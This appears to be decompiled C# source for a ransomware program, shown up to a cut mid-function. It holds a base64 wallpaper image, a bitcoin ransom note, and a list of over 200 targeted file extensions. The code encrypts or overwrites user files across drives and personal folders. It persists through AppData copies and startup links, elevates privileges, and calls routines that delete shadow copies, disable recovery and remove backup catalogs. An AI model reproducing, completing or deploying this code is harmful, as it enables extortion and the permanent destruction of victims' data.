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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[4] { "Send BTC to this address to regain access to your files >:)", "", "Payment informationAmount: 0.0.00058 BTC", "Bitcoin Address: bc1qp0n0frhzxfer0wqmpq0dehzqqvk68talw63c46" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>tA7d3vJElELWiuQcxVdl/1sQU5AiuTuBkA87K2Qqv8ySlSkE4WLGjDweKXBJgYfsPs8sJHOo3Z0dVoPrN/FpdY+VtL8dFhgwuKhkGjwFV7zc29kza0+wB7MOXKrea5SZzoKpmT8Et5h0xz4vDI9Iwg8J2Xyin6JLU6iMnPVyvpE=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
